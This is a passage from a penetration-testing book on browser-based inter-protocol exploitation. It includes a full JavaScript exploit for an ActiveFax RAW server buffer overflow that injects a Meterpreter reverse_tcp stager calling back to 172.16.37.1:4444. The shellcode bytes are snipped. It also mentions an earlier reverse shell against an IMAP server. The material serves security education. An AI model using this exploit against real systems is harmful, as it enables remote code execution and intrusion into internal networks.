
<x0.0168><y0.1667>Exploit’s Stager delivery from Firefox<x0.3969><y0.175><class_Picture>

![c10f021.tif](image_fi/662090c10/c10f021.png)

end figure

Because you specified a reverse_tcp Meterpreter payload, you need to bind a reverse connection handler before sending the request. This step is mandatory because when the handler receives the reverse connection from the target, it needs to reply sending back the Meterpreter Stage.

The final results of the exploitation are shown in <x0.3969><y0.2583>[Figure 10-22](#c10.html#figure10-22)<x0.5625><y0.2667>

start figure

<x0.0168><y0.3083>[**Figure 10-22:**](#c10.html#figureanchor10-22) Interaction with the compromised IMAP server<x0.3969><y0.3167>

![c10f022.tif](image_fi/662090c10/c10f022.png)

end figure

As you can see from the netstat command in <x0.3969><y0.3583>[Figure 10-22](#c10.html#figure10-22)<x0.5625><y0.3667>, you can now interact with the target system.

#### ActiveFax Inter-protocol Exploitation Example

ActiveFax is a popular network fax solution available for Windows. It is often found on internal networks. Craig Freyman discovered43 a buffer overflow in one of the commands processed by the RAW server component (versions 5.01 and below).

ActiveFax enables you to use LPD, RAW, and FTP protocols to transfer faxes. The Raw server accepts TCP packets and processes fax-related content contained between @Fx and @ delimiters, where @Fx is a specific command understood by the protocol.

The Raw server component can be bound to any TCP port. The user manual (page 112) suggests44 port 3000, which is not prohibited by port banning. It turns out that the RAW server component also uses an error-tolerant protocol. LPD and FTP are error tolerant too, as discussed before, but they are port banned. That’s why you want to focus on the RAW server component.

The buffer overflow condition exists in the @F506 command, which is responsible for exporting a fax using a specific file format and resolution. For instance, a valid command would be @F506 pdf,150@, to export the fax as a PDF with resolution 150.

The exploitation of this buffer overflow condition was a bit trickier than usual, because the space available for the Shellcode was not contiguous. Additionally, the Shellcode needed to be encoded to remove bad characters. All characters from \\x00 to \\x1f had to be removed, including \\x40 (@) because it’s used as a command prefix/suffix. In these cases, Metasploit’s alpha_mixed encoder comes in handy, but it comes at the cost of increasing the size of the Shellcode.

The following code can be launched from the hooked browser. It injects the Meterpreter Stager into memory by exploiting the buffer overflow vulnerability:

```
var target = "http://172.16.37.151";
var port = 3000;
var xhr = null;

// Meterpreter reverse_tcp stager.
// connects back to 172.16.37.1:4444
// encoded with x86/alpha_mixed
var stager = 
"\x89\xe2\xda[...snip...]";

// jmp esp in ole32.dll - Win XP SP3 English
var eip = '\x77\x9c\x55\x77';
// align the stack
var adjust = '\x81\xc4\x24\xfa\xff\xff';

var shellcode_chunk_1 = stager.slice(0,554);
var shellcode_chunk_2 = stager.slice(554, stager.length);

function genJunk(c, length){
  var temp = "";
    for(var i=0;i<length;i++){
     temp += c;
    }
    return temp; 
}

var fill = genJunk("\x42", (1024 - shellcode_chunk_2.length));

function sendRequest(port, data){
 xhr = new XMLHttpRequest();
 // for WebKit-based browsers
 var url = target + ":"+ port;
 if (!XMLHttpRequest.prototype.sendAsBinary) {
  XMLHttpRequest.prototype.sendAsBinary = function (sData) {
    var nBytes = sData.length, ui8Data = 
     new Uint8Array(nBytes);
    for (var nIdx = 0; nIdx < nBytes; nIdx++) {
      ui8Data[nIdx] = sData.charCodeAt(nIdx) & 0xff;
    }
    /* send as ArrayBufferView...: */
    this.send(ui8Data);
  };
 }
 xhr.open("POST", url, true);
 xhr.setRequestHeader("Content-Type", "text/plain");
 xhr.setRequestHeader('Accept','*/*');
 xhr.setRequestHeader("Accept-Language", "en");
 xhr.sendAsBinary(data);
}

// final shellcode
var payload = shellcode_chunk_2 + fill +
eip + adjust + shellcode_chunk_1;

var stager_request = "@F506 " + payload + "@\r\n\r\n";
sendRequest(port, stager_request);

setTimeout(function(){
  xhr.abort();
}, 2000);
```

The RAW server has a default socket timeout of 60 seconds. This is important because the Shellcode is executed only once the connection is terminated.

If you were writing this exploit in Ruby and you had a direct connection it would be trivial to drop the connection. However, remember you are launching this from a hooked browser. Don’t worry! You can obtain similar functionality with the XmlHttpRequest by using the abort() method.45 Aborting the XHR call a few seconds after sending the data results in the Shellcode getting executed without needing to wait for the RAW server to drop the connection.

The results of running the preceding code are shown in <x0.3969><y0.575>[Figure 10-23](#c10.html#figure10-23)<x0.5625><y0.5833>

start figure

<x0.0168><y0.625>[**Figure 10-23:**](#c10.html#figureanchor10-23) Interaction with the compromised ActiveFax server<x0.3969><y0.6333>

![c10f023.tif](image_fi/662090c10/c10f023.png)

end figure

Remember, the only thing you control inside the target internal network is the hooked browser. This situation may not be ideal because network perimeter egress filtering solutions might detect an outgoing connection from the target server in the internal network to a host in the Internet. Moreover, a vigilant system administrator will likely be more suspicious seeing a connection from an internal server to an unknown Internet-facing system, rather than a connection from an internal server to another internal system.
